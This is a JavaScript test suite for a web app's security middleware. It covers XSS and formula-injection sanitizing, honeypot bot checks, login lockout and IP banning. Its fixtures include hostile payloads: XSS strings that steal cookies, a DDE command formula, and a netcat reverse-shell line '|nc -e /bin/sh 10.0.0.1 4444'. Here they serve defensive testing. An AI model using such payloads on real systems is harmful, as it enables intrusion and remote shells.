const {
  sanitizeValue,
  sanitizeObject,
  generateChallengeToken,
  verifyBotChallenge,
  checkAccountLockout,
  trackFailedLogin,
  recordSuccessfulLogin,
  recordSecurityViolation,
  ipJailMiddleware
} = require('../middleware/securityGuards');

let passedTests = 0;
let failedTests = 0;

function assert(condition, message) {
  if (condition) {
    console.log(`  ✅ PASS: ${message}`);
    passedTests++;
  } else {
    console.error(`  ❌ FAIL: ${message}`);
    failedTests++;
  }
}

async function runSecurityTests() {
  console.log('================================================================');
  console.log('🔒 EXECUTING OWASP & BRUTE-FORCE SECURITY VERIFICATION SUITE');
  console.log('================================================================\n');

  // Test 1: XSS Payload Neutralization
  console.log('--- Test Suite 1: Recursive XSS Sanitization ---');
  const xssPayloads = [
    '<script>alert("pwned")</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(document.cookie)',
    'Hello <a href="vbscript:msgbox(1)">Click Me</a> World',
    '<iframe src="http://attacker.com"></iframe>'
  ];

  for (const payload of xssPayloads) {
    const sanitized = sanitizeValue(payload);
    assert(!sanitized.includes('<script>') && !sanitized.includes('onerror=') && !sanitized.includes('javascript:'), `Sanitized: "${payload}" -> "${sanitized}"`);
  }

  // Test 2: Formula / CSV / Hyperlink Injection Neutralization (CWE-1236)
  console.log('\n--- Test Suite 2: Formula & Hyperlink Injection Neutralization (CWE-1236) ---');
  const formulaPayloads = [
    '=cmd|"/C calc"!A0',
    '+SUM(1, 2)',
    '-1337+20',
    '@HYPERLINK("http://malicious.site", "Click Here")',
    '|nc -e /bin/sh 10.0.0.1 4444'
  ];

  for (const payload of formulaPayloads) {
    const sanitized = sanitizeValue(payload);
    assert(sanitized.startsWith("'"), `Neutralized formula prefix with apostrophe: "${payload}" -> "${sanitized}"`);
  }

  // Test 3: Password & Token Exemption (Zero Corruption Guarantee)
  console.log('\n--- Test Suite 3: Password & Sensitive Token Exemption ---');
  const sensitiveObj = {
    email: '  test@example.com  <script>alert(1)</script>',
    password: '=SuperSecret+P@ssword!<>',
    confirmPassword: '=SuperSecret+P@ssword!<>',
    twoFactorToken: '123456',
    token: 'jwt.header.payload+123='
  };

  const sanitizedObj = sanitizeObject(sensitiveObj);
  assert(sanitizedObj.password === '=SuperSecret+P@ssword!<>', 'Password was NOT mutated or prepended with apostrophe');
  assert(sanitizedObj.confirmPassword === '=SuperSecret+P@ssword!<>', 'confirmPassword was NOT mutated');
  assert(!sanitizedObj.email.includes('<script>'), 'Email was properly stripped of script tags');

  // Test 4: HMAC Bot Challenge Token Generation & Verification
  console.log('\n--- Test Suite 4: HMAC Cryptographic Bot Challenge Verification ---');
  const token = generateChallengeToken();
  assert(typeof token === 'string' && token.length > 20, `Generated valid challenge token: ${token.slice(0, 30)}...`);

  // Mock Request with Honeypot Trigger
  let mockReqHoneypot = {
    body: {
      hp_website_contact: 'im_a_spambot_filling_hidden_fields',
      _bot_challenge: token
    },
    ip: '192.168.1.100'
  };
  let honeypotRejected = false;
  let honeypotRes = {
    status: (code) => {
      if (code === 400) honeypotRejected = true;
      return { json: () => {} };
    }
  };
  verifyBotChallenge(mockReqHoneypot, honeypotRes, () => {});
  assert(honeypotRejected, 'Honeypot caught automated bot filling invisible field (returned 400)');

  // Test 5: Progressive Account Lockout & Brute-Force Rate Limiting
  console.log('\n--- Test Suite 5: Progressive Account Lockout (5 Failed Attempts -> 15m Lockout) ---');
  const testEmail = 'victim_account_' + Date.now() + '@hrmspro.online';
  const testIp = '10.20.30.40';

  assert(!checkAccountLockout(testEmail).isLocked, 'Initial state: Account is not locked');

  for (let i = 1; i <= 4; i++) {
    trackFailedLogin(testEmail, testIp);
    const check = checkAccountLockout(testEmail);
    assert(!check.isLocked, `Attempt ${i}: Account remains unlocked (attempts recorded)`);
  }

  // 5th failed attempt triggers lockout
  trackFailedLogin(testEmail, testIp);
  const lockoutState = checkAccountLockout(testEmail);
  assert(lockoutState.isLocked, '5th Failed Attempt: Account is now LOCKED for 15 minutes');
  assert(lockoutState.message.includes('locked'), 'Lockout message returned to client');

  // Reset upon successful login
  recordSuccessfulLogin(testEmail);
  assert(!checkAccountLockout(testEmail).isLocked, 'Successful login resets failed attempt counter');

  // Test 6: IP Jail System for Repeated Attackers
  console.log('\n--- Test Suite 6: IP Jail System (>25 Violations = 1hr IP Ban) ---');
  const attackerIp = '198.51.100.77';
  for (let i = 0; i < 26; i++) {
    recordSecurityViolation(attackerIp);
  }

  let jailTriggered = false;
  const mockJailReq = { ip: attackerIp };
  const mockJailRes = {
    status: (code) => {
      if (code === 403) jailTriggered = true;
      return { json: (data) => data };
    }
  };
  ipJailMiddleware(mockJailReq, mockJailRes, () => {});
  assert(jailTriggered, 'Repeated security violator IP successfully placed in IP Jail (HTTP 403 Forbidden)');

  console.log('\n================================================================');
  console.log(`📊 TEST RESULTS: ${passedTests} PASSED, ${failedTests} FAILED`);
  console.log('================================================================\n');

  if (failedTests > 0) {
    process.exit(1);
  }
}

runSecurityTests();
